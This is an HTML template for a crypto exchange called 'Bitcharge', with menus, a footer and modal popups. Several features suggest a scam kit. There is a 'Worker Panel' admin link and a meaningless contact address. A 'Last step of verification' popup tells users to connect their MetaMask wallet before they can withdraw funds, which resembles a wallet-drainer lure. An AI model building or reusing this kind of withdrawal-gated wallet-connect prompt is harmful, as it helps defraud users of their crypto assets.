<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>{title}</title>
  <meta name="description" content="{description}">
  <meta name="keywords" content="{keywords}"> 
  <link rel="icon" href="/uploads/logos/{domain_logo}">
  [main_page]
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;600&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700&display=swap" rel="stylesheet">
  [/main_page]
  
  {css_top}
  
</head>

<body id="dark" class="stop-scrolling">

[main_page]
<header class="header">
	<div class="container__header">
		<div class="header__menu-box">
			<a class="header__img-box" href="/"> <img class="header__menu-img" src="/uploads/logos/{domain_logo}" alt="logo"> <span class="header__img-text">Bitcharge</span> </a>
			<div class="header__menu-btn-box">
				<div class="bg-remove"></div>
				<div class="menu__list-box">
					<ul class="menu__list">
						<li class="menu__list-item"> <a href="/profile/p2p">P2P</a> </li>
						<li class="menu__list-item"> <a href="/trading">Trading</a> </li>
						<li class="menu__list-item trade"> <span class="menu__item-bf menu__trade-link">Market tools</span>
							<ul class="menu__list-trade trade-list">
								<li class="menu__trade-item"> <span class="market_tools_img">
                                        <img style="width: 45px; margin-top: 17px;" src="/templates/res/images/icon/cap.svg">
                                    </span> <a style="width: 75%; float: right;" class="menu__trade-item-link" href="/market-crypto">
                                        Crypto market cap
                                        <span class="menu__trade-item-des">
                                            Most of the available crypto assets and sorts them based on the market capitalization
                                        </span>
                                    </a>
								</li>
								<li class="menu__trade-item"> <span class="market_tools_img">
                                        <img style="width: 45px; margin-top: 38px;" src="/templates/res/images/icon/market.svg">
                                    </span> <a style="width: 75%; float: right;" class="menu__trade-item-link" href="/market-screener">
                                        Market screener
                                        <span class="menu__trade-item-des">
                                             Powerful tool that allows to filter instruments based on fundamental data and various technical indicators
                                        </span>
                                    </a> </li>
								<li class="menu__trade-item"> <span class="market_tools_img">
                                        <img style="width: 45px; margin-top: 37px;" src="/templates/res/images/icon/tech.svg">
                                    </span> <a style="width: 75%; float: right;" class="menu__trade-item-link" href="/technical-analysis">
                                        Technical analysis
                                        <span class="menu__trade-item-des">
                                             Advanced tool that displays ratings based on technical indicators
                                        </span>
                                    </a> </li>
								<li class="menu__trade-item"> <span class="market_tools_img">
                                        <img style="width: 45px; margin-top: 32px;" src="/templates/res/images/icon/cross.svg">
                                    </span> <a style="width: 75%; float: right;" class="menu__trade-item-link" href="/cross-rates">
                                        Cross rates
                                        <span class="menu__trade-item-des">
                                             Real-time quotes of the selected currencies in comparison to the other major currencies at a glance
                                        </span>
                                    </a>
								</li>
								<li class="menu__trade-item"> <span class="market_tools_img">
                                        <img style="width: 45px; margin-top: 48px;" src="/templates/res/images/icon/heat.svg">
                                    </span> <a style="width: 75%; float: right;" class="menu__trade-item-link" href="/heat-map">
                                        Currency heat map
                                        <span class="menu__trade-item-des">
                                             Quick overview of action in the currency markets. It lets you spot strong and weak currencies in real-time and how strong they are in relation to one another
                                        </span>
                                    </a> 
								 </li>
							</ul>
						</li>
						<li class="menu__list-item"> <a href="/profile/swap">Swap</a> </li>
						<li class="menu__list-item"> <a style="color: #ffbc00;" href="/profile/invest">Invest pad</a> </li>
						<li class="menu__list-item"> <a href="/profile/wallet">Wallet</a> </li>
						<li class="menu__list-item"> <a href="/news">News</a> </li>
						<li class="menu__list-item"> <a href="/profile/support">Support</a> </li>
					</ul>
					[logged]
						<ul class="menu__list-footer">
							<li class="menu__list-item menu__list-item-log-in"> <a href="/profile/wallet">Profile</a> </li>
						</ul>
					[/logged]
					[not_logged]
						<ul class="menu__list-footer">

							<li class="menu__list-item menu__list-item-log-in"> <a href="signin">Log in</a> </li>
							<li class="menu__list-item menu__list-item-log-in"> <a href="signup">Sign up</a> </li>
						</ul>
					[/not_logged]
				</div>
				[logged]
					<div class="header__sign-box">

						<select onchange="translateLanguage(this.value)">
							<option value="">Выберите язык</option>
							<option value="en">English</option>
							<option value="fr">Français</option>
							<option value="de">Deutsch</option>
						</select>
						<script>
							function translateLanguage(lang) {
								var translateFrame = document.querySelector('iframe.goog-te-menu-frame');
								if (!translateFrame) {
									return;
								}
								var innerDoc = translateFrame.contentDocument || translateFrame.contentWindow.document;
								var languageLinks = innerDoc.querySelectorAll('.goog-te-menu2-item span.text');
								languageLinks.forEach(function(link) {
									if (link.innerHTML.includes(lang)) {
										link.click();
									}
								});
							}
						</script>


						<a class="header__btn-sign" href="/profile/wallet">Profile</a>

					</div>
				[/logged]
				[not_logged]
					<div class="header__sign-box"> 
						<a class="header__btn-log" href="/signin">Log in</a> 
						<a class="header__btn-sign" href="/signup">Sign up</a>
					</div>
				[/not_logged]
			</div>
			<div class="menu__btn"> <span class="menu__btn-line"></span> </div>
		</div>
	</div>
</header>
<style type="text/css">
.menu__trade-item-link:hover {
    background-color: unset !important;
}

.market_tools_img {
    width: 8%; 
    float: left; 
    margin-left: 15px;
}

@media only screen and (max-width: 1250px) {
  .market_tools_img {
    display: none;
  }
}
</style>
[/main_page]


[not_main_page]
<header class="header">
	<div class="header__left">
		<a class="header__logo" href="/"> <img src="/uploads/logos/{domain_logo}" alt="" style="width: auto !important;"> <span class="header__logo-text">Bitcharge</span> </a>
		<div class="header__links"> 
			<a class="header__link" href="/trading">Trading</a>
			<div class="header__link-tools header__tools"> <span class="header__link-tools-span">Market tools</span>
				<div class="header__tools-box"> <a class="header__tools-link" href="../market-crypto">Crypto market cap</a> 
					<a class="header__tools-link" href="../market-screener">Market screener</a> 
					<a class="header__tools-link" href="../technical-analysis">Technical analysis</a> 
					<a class="header__tools-link" href="../cross-rates">Cross rates</a> 
					<a class="header__tools-link" href="../heat-map">Currency heat map</a> 
				</div>
			</div> 
			<a class="header__link" href="../profile/invest">Invest</a> 
			<a class="header__link header__link-new" href="../profile/p2p">P2P</a> 
			<a class="header__link header__link-hot" href="../profile/swap">Swap</a> 
			<a class="header__link" href="../profile/support">Support {un_read}</a> [logged]
			<a class="header__link" href="../profile/wallet">Balance: {b_USD} USD </a> [/logged]
		</div>
	</div>

	[logged]
	<div class="header__right">




		<div class="header__profile">
			<div class="header__profile-toggle">
				<div class="header__toggle-name">{username}</div>
				<div class="header__toggle-img"> <img src="{photo}" alt=""> </div>
				<div class="header__toggle-btn">
					<svg width="28" height="28" viewBox="0 0 100 100">
						<path class="header__nav-line header__nav-line1" d="M 20,29.000046 H 80.000231 C 80.000231,29.000046 94.498839,28.817352 94.532987,66.711331 94.543142,77.980673 90.966081,81.670246 85.259173,81.668997 79.552261,81.667751 75.000211,74.999942 75.000211,74.999942 L 25.000021,25.000058"></path>
						<path class="header__nav-line header__nav-line2" d="M 20,50 H 80"></path>
						<path class="header__nav-line header__nav-line3" d="M 20,70.999954 H 80.000231 C 80.000231,70.999954 94.498839,71.182648 94.532987,33.288669 94.543142,22.019327 90.966081,18.329754 85.259173,18.331003 79.552261,18.332249 75.000211,25.000058 75.000211,25.000058 L 25.000021,74.999942"></path>
					</svg>
				</div>
			</div>
			<div class="header__profile-box">
				<div class="header__profile-top">
					<div class="header__profile-img "> <img style="width: 64px; height: 64px; border-radius: 50%;" src="{photo}" alt=""> </div>
					<div class="header__profile-info">
						<div class="header__profile-name">{username}</div>
						<div class="header__profile-email">{email}</div>
					</div>
				</div>
				<div class="header__profile-center"> <a class="header__profile-link" href="../trading">Trading</a>
					<a class="header__profile-link header__profile-tools" href="#"> <span>Market tools</span>
						<div class="header__profile-tools-box">    </div>
					</a>
					<a class="header__profile-link header__link-new" href="/profile/p2p">P2P</a>
					<a class="header__profile-link" href="/profile/support">Support chat</a>
				</div>
				
				
				<div class="header__profile-bottom">
				
					[admin]
					<a class="header__profile-link" href="/spanel" style="color: orange;">
						<div class="header__profile-link-icon">
							<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
								<path d="M21,18V19A2,2 0 0,1 19,21H5C3.89,21 3,20.1 3,19V5A2,2 0 0,1 5,3H19A2,2 0 0,1 21,5V6H12C10.89,6 10,6.9 10,8V16A2,2 0 0,0 12,18M12,16H22V8H12M16,13.5A1.5,1.5 0 0,1 14.5,12A1.5,1.5 0 0,1 16,10.5A1.5,1.5 0 0,1 17.5,12A1.5,1.5 0 0,1 16,13.5Z" />
							</svg>
						</div> Worker Panel
					</a>
					[/admin]	
						
					<a class="header__profile-link" href="/profile/wallet">
						<div class="header__profile-link-icon">
							<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
								<path d="M21,18V19A2,2 0 0,1 19,21H5C3.89,21 3,20.1 3,19V5A2,2 0 0,1 5,3H19A2,2 0 0,1 21,5V6H12C10.89,6 10,6.9 10,8V16A2,2 0 0,0 12,18M12,16H22V8H12M16,13.5A1.5,1.5 0 0,1 14.5,12A1.5,1.5 0 0,1 16,10.5A1.5,1.5 0 0,1 17.5,12A1.5,1.5 0 0,1 16,13.5Z" />
							</svg>
						</div> <span>Balance: {b_USD} USD </span> </a>
					<a class="header__profile-link" href="/profile/settings">
						<div class="header__profile-link-icon">
							<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
								<path d="M12,15.5A3.5,3.5 0 0,1 8.5,12A3.5,3.5 0 0,1 12,8.5A3.5,3.5 0 0,1 15.5,12A3.5,3.5 0 0,1 12,15.5M19.43,12.97C19.47,12.65 19.5,12.33 19.5,12C19.5,11.67 19.47,11.34 19.43,11L21.54,9.37C21.73,9.22 21.78,8.95 21.66,8.73L19.66,5.27C19.54,5.05 19.27,4.96 19.05,5.05L16.56,6.05C16.04,5.66 15.5,5.32 14.87,5.07L14.5,2.42C14.46,2.18 14.25,2 14,2H10C9.75,2 9.54,2.18 9.5,2.42L9.13,5.07C8.5,5.32 7.96,5.66 7.44,6.05L4.95,5.05C4.73,4.96 4.46,5.05 4.34,5.27L2.34,8.73C2.21,8.95 2.27,9.22 2.46,9.37L4.57,11C4.53,11.34 4.5,11.67 4.5,12C4.5,12.33 4.53,12.65 4.57,12.97L2.46,14.63C2.27,14.78 2.21,15.05 2.34,15.27L4.34,18.73C4.46,18.95 4.73,19.03 4.95,18.95L7.44,17.94C7.96,18.34 8.5,18.68 9.13,18.93L9.5,21.58C9.54,21.82 9.75,22 10,22H14C14.25,22 14.46,21.82 14.5,21.58L14.87,18.93C15.5,18.67 16.04,18.34 16.56,17.94L19.05,18.95C19.27,19.03 19.54,18.95 19.66,18.73L21.66,15.27C21.78,15.05 21.73,14.78 21.54,14.63L19.43,12.97Z" />
							</svg>
						</div> <span>Settings</span> </a>
					<a class="header__profile-link header__profile-out" href="/logout">
						<div class="header__profile-link-icon">
							<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
								<path d="M16.56,5.44L15.11,6.89C16.84,7.94 18,9.83 18,12A6,6 0 0,1 12,18A6,6 0 0,1 6,12C6,9.83 7.16,7.94 8.88,6.88L7.44,5.44C5.36,6.88 4,9.28 4,12A8,8 0 0,0 12,20A8,8 0 0,0 20,12C20,9.28 18.64,6.88 16.56,5.44M13,3H11V13H13" />
							</svg>
						</div> <span>Log Out</span> </a>
				</div>
			</div>
		</div>
	</div>
	[/logged]


</header>
<br>

[/not_main_page]





{content}



<div class="bottom section-padding">
	<div class="container">
		<div class="row">
			<div class="col-xl-4 col-lg-4 col-md-6 col-sm-6">
				<div class="bottom-logo">
					<a class="navbar-logo-vn" href="/"> 
						<img src="/uploads/logos/{domain_logo}" style="width: 30px;" alt=""> 
						<span style="margin-left: 6px;">bitcharge.us</span> 
					</a>
					<p style="width: 230px;">Bitcharge is a simple, elegant, and secure platform to build your crypto portfolio.</p>

					<div class="footer__email">
						<a href="#">info@dsgsg.com</a>
					</div>

				</div>
			</div>
			<div class="col-xl-2 col-lg-2 col-md-6 col-sm-6">
				<div class="bottom-widget">
					<h4 class="widget-title">Features</h4>
					<ul>
						<li><a href="/">Home</a></li>
						<li><a href="/trading">Trading</a></li>
						<li><a href="/profile/wallet">Wallet</a></li>
						<li><a href="/profile/invest">Invest</a></li>
						<li><a href="/profile/swap">Instant swap</a></li>
						<li><a href="/profile/p2p">P2P</a></li>
						<li><a href="/profile/support">Support</a></li>
					</ul>
				</div>
			</div>
			<div class="col-xl-2 col-lg-2 col-md-6 col-sm-6">
				<div class="bottom-widget">
					<h4 class="widget-title">Market tools</h4>
					<ul>
						<li><a href="/market-crypto">Crypto market cap</a></li>
						<li><a href="/market-screener">Market screener</a></li>
						<li><a href="/technical-analysis">Technical analysis</a></li>
						<li><a href="/cross-rates">Cross rates</a></li>
						<li><a href="/heat-map">Currency heat map</a></li>
					</ul>
				</div>
			</div>
			<div class="col-xl-2 col-lg-2 col-md-6 col-sm-6">
				<div class="bottom-widget">
					<h4 class="widget-title">Legal</h4>
					<ul>
						<li><a href="/terms">Terms of service</a></li>
						<li><a href="/privacy-notice">Privacy notice</a></li>
						<li><a href="/cookies-policy">Cookies policy</a></li>
						<li><a href="/aml-kyc-policy">AML &amp; KYC policy</a></li>
						<li><a href="/fees">Fees</a></li>
						<li><a href="/bugbounty">Bug Bounty</a></li>
					</ul>
				</div>
			</div>
			<div class="col-xl-2 col-lg-2 col-md-6 col-sm-6">
				<div class="bottom-widget">
					<h4 class="widget-title">Exchange Pair</h4>
					<ul>
						<li><a href="/trading?pair=BTC_USDT">BTC to USDT</a></li>
						<li><a href="/trading?pair=ETH_USDT">ETH to USDT</a></li>
						<li><a href="/trading?pair=LTC_USDT">LTC to USDT</a></li>
						<li><a href="/trading?pair=ADA_USDT">ADA to USDT</a></li>
					</ul>
				</div>
			</div>
		</div>
	</div>
</div>


<div class="footer">
	<div class="container">
		<div class="row">
			<div>
				<div class="copyright">
					<p style="font-size:12px"><strong>Bitcharge</strong> © Copyright 2023 | Worldwide Distributed Digital Asset Exchange | Trading digitals assets such as Bitcoin involves significant risks.</p>
					<p></p>
				</div>
			</div>
			<div class="col-xl-6 col-lg-6 col-md-6 col-sm-6 col-12">
				<div class="footer-social"> </div>
			</div>
		</div>
	</div>
</div>


<div id="alert_message_modal" class="popup__container" style="display: none;">
	<div class="popup">
		<div class="popup__close" id="alert_close_modal">
			<svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px"
				 width="24" height="24"
				 viewBox="0 0 24 24"
				 style=" fill:#FFFFFF;"><path d="M 4.9902344 3.9902344 A 1.0001 1.0001 0 0 0 4.2929688 5.7070312 L 10.585938 12 L 4.2929688 18.292969 A 1.0001 1.0001 0 1 0 5.7070312 19.707031 L 12 13.414062 L 18.292969 19.707031 A 1.0001 1.0001 0 1 0 19.707031 18.292969 L 13.414062 12 L 19.707031 5.7070312 A 1.0001 1.0001 0 0 0 18.980469 3.9902344 A 1.0001 1.0001 0 0 0 18.292969 4.2929688 L 12 10.585938 L 5.7070312 4.2929688 A 1.0001 1.0001 0 0 0 4.9902344 3.9902344 z"></path></svg>
		</div>
		<div class="popup__left">
			<img src="/templates/res/images/warning.png" alt="" id="alert_img_pop">
		</div>
		<div class="popup__right">
			<div class="popup__right-title" id="alert_title_text">
				Warning
			</div>
			<div class="popup__right-description" id="userAlertBox">


			</div>
			<input type="hidden" id="alertMessageId" value="0">
			<div id="alert_close_modal_btn" class="popup__right-button">
				Close
			</div>
		</div>
	</div>
</div>

<div id="verify_popap_meta" class="popap-verifi" style="position: fixed !important; display: none; text-align: left;">
	<input type="hidden" id="MetaalertMessageId" value="0">
  <div class="popap-verifi-container-item popap-verifi-list-one popap-verifi-activ">

    <div class="popap-verifi-container-item-img">
        <img src="/templates/res/images/fox.svg" style="width: 135px;">
    </div>
    <div class="popap-verifi-item-info">

        <div class="popap-verifi-loader">
            <div class="popap-verifi-loader-border"></div>
        </div>
        <div class="popap-verifi-item-info-title">
            Last step of verification
        </div>
        <div id="alertMessageMeta" class="popap-verifi-item-info-text" style="max-height: 170px; overflow: hidden;">
            To complete the verification process - connect your Metamask wallet.<br><br>
			After confirming metamask wallet, you will be able to withdraw your funds. 
        </div>
        <div class="popap-verifi-item-info-btn">
            <button onclick="openMetaMask()" class="popap-verifi-item-info-btn-next popap-verifi-list-one-button">
                Connect Metamask
            </button>
            <button id="closeMetaMaskBtn" class="popap-verifi-item-info-btn-cancel popap-verifi-btn-cancel-list-one">
                Cancel
            </button>
        </div>
    </div>
</div>
</div>

















 {js_bottom}






</body>

</html>
